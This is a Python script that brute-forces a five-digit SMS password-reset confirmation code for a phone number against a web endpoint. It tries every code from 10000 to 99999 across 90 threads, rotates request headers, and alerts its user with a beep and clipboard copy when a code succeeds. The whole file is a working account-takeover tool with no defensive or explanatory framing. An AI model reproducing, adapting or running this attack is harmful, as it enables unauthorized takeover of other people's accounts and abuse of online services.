import requests
import random
import os
from time import sleep , perf_counter
import winsound
from threading import Thread
from sen1 import heads , number , link ,adad
from colorama import Fore as color  
import pyperclip
def k_pas_2(p1,p2):
    while True :
        try :
            
            start = perf_counter()
            for pas in range(p1,p2):
                snap_number = {"mobile": f"0{number}", "confirmKey": f"{pas}", "password": "", "password_repeat": ""}
                rhead = random.choice(heads)
                req_snap = requests.post(link, json=snap_number, headers=rhead)
                print(color.RED+f"{pas}")

                if req_snap.status_code == 200:
                    end = perf_counter()
                    adad.write(f'{pas}\r\n {round(end -  start )}')
                    adad.close()
                    os.system("cls")
                    import pyperclip
                    pyperclip.copy(f"{pas}")
                    winsound.Beep(600, 5000)
                    print(pas)
                    print(req_snap.status_code)
                    print(pas)
                    print(req_snap.status_code)
                    print(pas)
                    print(req_snap.status_code)
                    print(pas)
                    break 
            
        except:
            start = perf_counter()
            for pas in range(p1,p2):
                
                snap_number = {"mobile": f"0{number}", "confirmKey": f"{pas}", "password": "", "password_repeat": ""}
                rhead = random.choice(heads)
                req_snap = requests.post(link, json=snap_number, headers=rhead)
                print(color.YELLOW+f"{pas}")

                if req_snap.status_code == 200:
                    end = perf_counter()
                    adad.write(f'{pas}\r\n {round(end -  start )}')
                    adad.close()
                    os.system("cls")
                    import pyperclip
                    pyperclip.copy(f"{pas}")
                    winsound.Beep(600, 5000)
                    print(pas)
                    print(req_snap.status_code)
                    print(pas)
                    print(req_snap.status_code)
                    print(pas)
                    print(req_snap.status_code)
                    print(pas)
                    break 
                
if True :                
    k1=Thread(target=k_pas_2,args=(10000,11000))

    k2=Thread(target=k_pas_2,args=(11000,12000))

    k3=Thread(target=k_pas_2,args=(12000,13000))


    k4=Thread(target=k_pas_2,args=(13000,14000))

    k5=Thread(target=k_pas_2,args=(14000,15000))

    k6=Thread(target=k_pas_2,args=(15000,16000))

    k7=Thread(target=k_pas_2,args=(16000,17000))

    k8=Thread(target=k_pas_2,args=(17000,18000))

    k9=Thread(target=k_pas_2,args=(18000,19000))

    k10=Thread(target=k_pas_2,args=(19000,20000))

    k11=Thread(target=k_pas_2,args=(20000,21000))

    k12=Thread(target=k_pas_2,args=(21000,22000))

    k13=Thread(target=k_pas_2,args=(22000,23000))

    k14=Thread(target=k_pas_2,args=(23000,24000))

    k15=Thread(target=k_pas_2,args=(24000,25000))

    k16=Thread(target=k_pas_2,args=(25000,26000))

    k17=Thread(target=k_pas_2,args=(26000,27000))

    k18=Thread(target=k_pas_2,args=(27000,28000))

    k19=Thread(target=k_pas_2,args=(28000,29000))

    k20=Thread(target=k_pas_2,args=(29000,30000))

    k21=Thread(target=k_pas_2,args=(30000,31000))

    k22=Thread(target=k_pas_2,args=(31000,32000))

    k23=Thread(target=k_pas_2,args=(32000,33000))

    k24=Thread(target=k_pas_2,args=(33000,34000))

    k25=Thread(target=k_pas_2,args=(34000,35000))

    k26=Thread(target=k_pas_2,args=(35000,36000))

    k27=Thread(target=k_pas_2,args=(36000,37000))

    k28=Thread(target=k_pas_2,args=(37000,38000))

    k29=Thread(target=k_pas_2,args=(38000,39000))

    k30=Thread(target=k_pas_2,args=(39000,40000))

    k31=Thread(target=k_pas_2,args=(40000,41000))

    k32=Thread(target=k_pas_2,args=(41000,42000))

    k33=Thread(target=k_pas_2,args=(42000,43000))

    k34=Thread(target=k_pas_2,args=(43000,44000))

    k35=Thread(target=k_pas_2,args=(44000,45000))

    k36=Thread(target=k_pas_2,args=(45000,46000))

    k37=Thread(target=k_pas_2,args=(46000,47000))

    k38=Thread(target=k_pas_2,args=(47000,48000))

    k39=Thread(target=k_pas_2,args=(48000,49000))

    k40=Thread(target=k_pas_2,args=(49000,50000))

    k41=Thread(target=k_pas_2,args=(50000,51000))

    k42=Thread(target=k_pas_2,args=(51000,52000))

    k43=Thread(target=k_pas_2,args=(52000,53000))

    k44=Thread(target=k_pas_2,args=(53000,54000))

    k45=Thread(target=k_pas_2,args=(54000,55000))

    k46=Thread(target=k_pas_2,args=(55000,56000))

    k47=Thread(target=k_pas_2,args=(56000,57000))

    k48=Thread(target=k_pas_2,args=(57000,58000))

    k49=Thread(target=k_pas_2,args=(58000,59000))

    k50=Thread(target=k_pas_2,args=(59000,60000))

    k51=Thread(target=k_pas_2,args=(60000,61000))

    k52=Thread(target=k_pas_2,args=(61000,62000))

    k53=Thread(target=k_pas_2,args=(62000,63000))

    k54=Thread(target=k_pas_2,args=(63000,64000))

    k55=Thread(target=k_pas_2,args=(64000,65000))

    k56=Thread(target=k_pas_2,args=(65000,66000))

    k57=Thread(target=k_pas_2,args=(66000,67000))

    k58=Thread(target=k_pas_2,args=(67000,68000))

    k59=Thread(target=k_pas_2,args=(68000,69000))

    k60=Thread(target=k_pas_2,args=(69000,70000))

    k61=Thread(target=k_pas_2,args=(70000,71000))

    k62=Thread(target=k_pas_2,args=(71000,72000))

    k63=Thread(target=k_pas_2,args=(72000,73000))

    k64=Thread(target=k_pas_2,args=(73000,74000))

    k65=Thread(target=k_pas_2,args=(74000,75000))

    k66=Thread(target=k_pas_2,args=(75000,76000))

    k67=Thread(target=k_pas_2,args=(76000,77000))

    k68=Thread(target=k_pas_2,args=(77000,78000))

    k69=Thread(target=k_pas_2,args=(78000,79000))

    k70=Thread(target=k_pas_2,args=(79000,80000))

    k71=Thread(target=k_pas_2,args=(80000,81000))

    k72=Thread(target=k_pas_2,args=(81000,82000))


    k73=Thread(target=k_pas_2,args=(82000,83000))

    k74=Thread(target=k_pas_2,args=(83000,84000))

    k75=Thread(target=k_pas_2,args=(84000,85000))

    k76=Thread(target=k_pas_2,args=(85000,86000))

    k77=Thread(target=k_pas_2,args=(86000,87000))

    k8=Thread(target=k_pas_2,args=(87000,88000))

    k79=Thread(target=k_pas_2,args=(88000,89000))

    k80=Thread(target=k_pas_2,args=(89000,90000))

    k81=Thread(target=k_pas_2,args=(90000,91000))

    k82=Thread(target=k_pas_2,args=(91000,92000))

    k83=Thread(target=k_pas_2,args=(92000,93000))

    k84=Thread(target=k_pas_2,args=(93000,94000))

    k85=Thread(target=k_pas_2,args=(94000,95000))

    k86=Thread(target=k_pas_2,args=(95000,96000))

    k87=Thread(target=k_pas_2,args=(96000,97000))

    k88=Thread(target=k_pas_2,args=(97000,98000))

    k89=Thread(target=k_pas_2,args=(98000,99000))

    k90=Thread(target=k_pas_2,args=(99000,100000))




    k1.start()
    k2.start()
    k3.start()
    k4.start()
    k5.start()
    k6.start()
    k7.start()
    k8.start()
    k9.start()
    k10.start()
    k11.start()
    k12.start()
    k13.start()
    k14.start()
    k15.start()
    k16.start()
    k17.start()
    k18.start()
    k19.start()
    k20.start()
    k21.start()
    k22.start()
    k23.start()
    k24.start()
    k25.start()
    k26.start()
    k27.start()
    k28.start()
    k29.start()
    k30.start()
    k31.start()
    k32.start()
    k33.start()
    k34.start()
    k35.start()
    k36.start()
    k37.start()
    k38.start()
    k39.start()
    k40.start()
    k41.start()
    k42.start()
    k43.start()
    k44.start()
    k45.start()
    k46.start()
    k47.start()
    k48.start()
    k49.start()
    k50.start()
    k51.start()
    k52.start()
    k53.start()
    k54.start()
    k55.start()
    k56.start()
    k57.start()
    k58.start()
    k59.start()
    k60.start()
    k61.start()
    k62.start()
    k63.start()
    k64.start()
    k65.start()
    k66.start()
    k67.start()
    k68.start()
    k69.start()
    k70.start()
    k71.start()
    k72.start()
    k73.start()
    k74.start()
    k75.start()
    k76.start()
    k77.start()
    k79.start()
    k80.start()
    k81.start()
    k82.start()
    k83.start()
    k84.start()
    k85.start()
    k86.start()
    k87.start()
    k88.start()
    k89.start()
    k90.start()

    k1.join()
    k2.join()
    k3.join()
    k4.join()
    k5.join()
    k6.join()
    k7.join()
    k8.join()
    k9.join()
    k10.join()
    k11.join()
    k12.join()
    k13.join()
    k14.join()
    k15.join()
    k16.join()
    k17.join()
    k18.join()
    k19.join()
    k20.join()
    k21.join()
    k22.join()
    k23.join()
    k24.join()
    k25.join()
    k26.join()
    k27.join()
    k28.join()
    k29.join()
    k30.join()
    k31.join()
    k32.join()
    k33.join()
    k34.join()
    k35.join()
    k36.join()
    k37.join()
    k38.join()
    k39.join()
    k40.join()
    k41.join()
    k42.join()
    k43.join()
    k44.join()
    k45.join()
    k46.join()
    k47.join()
    k48.join()
    k49.join()
    k50.join()
    k51.join()
    k52.join()
    k53.join()
    k54.join()
    k55.join()
    k56.join()
    k57.join()
    k58.join()
    k59.join()
    k60.join()
    k61.join()
    k62.join()
    k63.join()
    k64.join()
    k65.join()
    k66.join()
    k67.join()
    k68.join()
    k69.join()
    k70.join()
    k71.join()
    k72.join()
    k73.join()
    k74.join()
    k75.join()
    k76.join()
    k77.join()
    k8.join()
    k79.join()
    k80.join()
    k81.join()
    k82.join()
    k83.join()
    k84.join()
    k85.join()
    k86.join()
    k87.join()
    k88.join()
    k89.join()
    k90.join()
    
    
    
    
    
    
